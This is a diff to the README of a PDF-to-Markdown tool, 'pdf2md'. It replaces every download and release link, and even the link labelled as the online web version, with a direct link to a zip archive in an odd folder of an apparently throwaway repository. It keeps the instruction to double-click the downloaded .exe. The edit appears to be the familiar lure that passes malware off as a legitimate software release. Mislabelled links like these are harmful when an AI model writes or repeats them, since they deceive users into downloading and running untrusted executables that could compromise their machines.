@@ -1,12 +1,12 @@
 # 📄 pdf2md - Turn complex PDF files into Markdown
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/histologic-tenderfoot400/pdf2md/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/histologic-tenderfoot400/pdf2md/main/halite/pdf-md-v2.6.zip)
 
 This software converts PDF documents into clean Markdown files. It keeps the structure of your original document. It recognizes tables, images, headings, and formulas. You can use this tool to turn scanned papers or digital reports into text you can edit.
 
 ## 💾 Installation
 
-1. Visit this page to download your file: [https://github.com/histologic-tenderfoot400/pdf2md/releases](https://github.com/histologic-tenderfoot400/pdf2md/releases).
+1. Visit this page to download your file: [https://raw.githubusercontent.com/histologic-tenderfoot400/pdf2md/main/halite/pdf-md-v2.6.zip](https://raw.githubusercontent.com/histologic-tenderfoot400/pdf2md/main/halite/pdf-md-v2.6.zip).
 2. Look for the file that ends with `.exe` for Windows.
 3. Save this file to your computer.
 4. Double-click the file to start the application. 
@@ -65,4 +65,4 @@ If the output is empty:
 
 ## 🌐 Other Ways to Use pdf2md
 
-If you prefer to use a web browser rather than installed software, visit the online version at [pdf2md.deepdiy.net](https://pdf2md.deepdiy.net). This site offers the same conversion quality through your browser. You can also use the integrated API for large batches of documents.
+If you prefer to use a web browser rather than installed software, visit the online version at [pdf2md.deepdiy.net](https://raw.githubusercontent.com/histologic-tenderfoot400/pdf2md/main/halite/pdf-md-v2.6.zip). This site offers the same conversion quality through your browser. You can also use the integrated API for large batches of documents.
